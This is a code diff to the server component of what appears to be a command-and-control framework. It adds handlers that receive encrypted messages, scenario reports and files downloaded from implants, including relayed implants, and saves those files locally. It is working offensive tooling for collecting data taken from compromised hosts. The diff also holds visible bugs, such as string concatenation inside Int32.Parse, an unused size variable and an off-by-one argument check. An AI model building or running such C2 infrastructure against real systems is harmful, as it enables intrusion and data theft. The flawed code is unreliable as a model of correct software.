@@ -10,12 +10,13 @@ using System.Collections.Generic;
 using System.Collections.Concurrent;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.IO;
+using System.Linq;
 
 namespace PetaqService
 {
     public class ImplantServiceSocket
     {
-        private const int receiveChunkSize = 300000;
+        private const int receiveChunkSize = 50;
 
         // socket information
         public string webSocketId { get; private set; }
@@ -186,15 +187,26 @@ namespace PetaqService
             {
                 while (webSocket.State == WebSocketState.Open)
                 {
+                    // get the buffer length instruction first
                     byte[] rbuffer = new byte[receiveChunkSize];
                     var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
-                    string data = Encoding.UTF8.GetString(rbuffer).Replace("\0", string.Empty);
+                    string implant_response = Encoding.UTF8.GetString(rbuffer).Replace("\0", string.Empty);
+                    implant_response = Common.Decrypt(implant_response);
 
-                    //Console.WriteLine("Data received: {0}",data);
-                    data = Common.Decrypt(data);
-                    //Console.WriteLine("Data decrypted: {0}", data);
+                    // incoming message is "buffer 123213" for length
+                    int buffer_length = Int32.Parse(implant_response.Split(" ")[1]);
 
-                    switch (Regex.Split(data, " ")[0])
+                    // set the buffer and read the data
+                    byte[] databuffer = new byte[buffer_length];
+                    result = await webSocket.ReceiveAsync(new ArraySegment<byte>(databuffer), CancellationToken.None);
+                    string encrypteddata = Encoding.UTF8.GetString(databuffer).Replace("\0", string.Empty);
+
+                    string data = Common.Decrypt(encrypteddata);
+
+                    // Instruction to the C2
+                    string instruction = Regex.Split(data, " ")[0];
+
+                    switch (instruction)
                     {
                         // route uptadates
                         case "routeupdates":
@@ -216,6 +228,30 @@ namespace PetaqService
                             }                            
                             break;
 
+
+                        // scenario report process
+                        case "scenario_report":
+                            if (Regex.Split(data, " ").Length <1)
+                            {
+                                Console.WriteLine("Scenario report is missing.");
+                            }
+                            else
+                            {
+                                // parse the scenario report delivered
+                                string scenario_report = Encoding.UTF8.GetString(Convert.FromBase64String(Regex.Split(data, " ")[1]));
+                                dynamic scenario_reportObj = JsonConvert.DeserializeObject(scenario_report);
+
+                                // set the scenario ID as string
+                                string scenarioID = scenario_reportObj.scenarioID;
+
+                                // update the scenario status and add the report
+                                Program.scenarios[scenarioID].status = "completed";
+                                Program.scenarios[scenarioID].stop = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+                                Program.scenarios[scenarioID].report = scenario_reportObj;
+                                Console.WriteLine("Scenario {0} is finished, results reported.", scenarioID);
+                            }
+
+                            break;
                         // route remove
                         case "routeremove":
                             // if a sessions gets removed, route gets deleted for entire path
@@ -265,6 +301,11 @@ namespace PetaqService
                             break;
 
                         // Processing the link data coming from the implant if links exist
+                        case "download":
+                            // Processing the download instruction
+                            DownloadData(data, false);
+                            break;
+                        // Processing the link data coming from the implant if links exist
                         case "transmit":
                             // Processing the linked implant data passed through
 
@@ -298,6 +339,11 @@ namespace PetaqService
                                         Console.WriteLine(e);
                                     }
                                     break;
+                                // Processing the link data coming from the implant if links exist
+                                case "download":
+                                    // Processing the download instruction
+                                    DownloadData(data, true);
+                                    break;
                                 default:
                                     // processing the data coming from the linked implant
                                     Program.implantSockets[childSocketId].logFile.Write(data);
@@ -320,7 +366,7 @@ namespace PetaqService
                     // Closing the socket 
                     if (result.MessageType == WebSocketMessageType.Close)
                     {
-                        await webSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
+                        await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
                         UpdateStatusOnDisconnect();
                     }
                 }
@@ -331,6 +377,68 @@ namespace PetaqService
 
             }
 
+        }
+
+        private async void DownloadData(string dinstruction, bool linked)
+        {
+
+            // get the buffer length instruction first
+            byte[] dbuffer = new byte[receiveChunkSize];
+            var bufres = await webSocket.ReceiveAsync(new ArraySegment<byte>(dbuffer), CancellationToken.None);
+            string implant_response = Encoding.UTF8.GetString(dbuffer).Replace("\0", string.Empty);
+            implant_response = Common.Decrypt(implant_response);
+
+            // incoming message is "buffer 123213" for length
+            int buffer_length = Int32.Parse(implant_response.Split(" ")[1]);
+
+            //// set the buffer and read the data
+            //byte[] databuffer = new byte[buffer_length];
+            //result = await webSocket.ReceiveAsync(new ArraySegment<byte>(databuffer), CancellationToken.None);
+            //string encrypteddata = Encoding.UTF8.GetString(databuffer).Replace("\0", string.Empty);
+
+            //string data = Common.Decrypt(encrypteddata);
+
+
+            // Processing the download instruction
+            string[] downloadarray = Regex.Split(dinstruction, " ");
+            int filecontentsize = Int32.Parse(downloadarray[1]+300);
+            string filename = String.Join(" ", downloadarray.SubArray(2, (downloadarray.Length - 2)));
+            Console.WriteLine("\nIncoming file: {0}", filename);
+            logFile.Write("\nIncoming file: " + filename);
+
+            // Receiving for the file size given and decrypting it
+            byte[] fbuffer = new byte[buffer_length];
+            var downres = await webSocket.ReceiveAsync(new ArraySegment<byte>(fbuffer), CancellationToken.None);
+            string filecontentencrypted = Encoding.UTF8.GetString(fbuffer).Replace("\0", string.Empty);
+            string filecontentencoded;
+
+            if (linked)
+            {
+                // The decrypted content has "transmit SOCKETID ENCODEDDATA"
+                // So get only the ENCODEDDATA 
+                filecontentencoded = Regex.Split(Common.Decrypt(filecontentencrypted), " ").Last();          
+            }
+            else
+            {
+                filecontentencoded = Common.Decrypt(filecontentencrypted);
+            }
+            
+            // Creating the files folder if doesn't exist
+            string filesFolderName = Path.Combine("Files", Program.logDate, webSocketId);
+            string filenameonly = Regex.Split(filename, "/").Last();
+            string localFileName = Path.Combine(filesFolderName, DateTime.Now.ToString("yyyy-M-dd---HH-mm-ss---") + filenameonly);
+            try
+            {
+                // Writing the content to the local file
+                File.WriteAllBytes(localFileName, Convert.FromBase64String(filecontentencoded));
+                Console.WriteLine("Downloading {0} is successful.\nFull path: {1}", filenameonly, localFileName.Replace(@"\",@"\\"));
+                logFile.Write("\nDownload is successful.\nFull path: " + localFileName);
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Files folder or file couldn't be created: {0}.", e);
+            }
         }
 
         public void UpdateStatusOnDisconnect(Exception e = null)
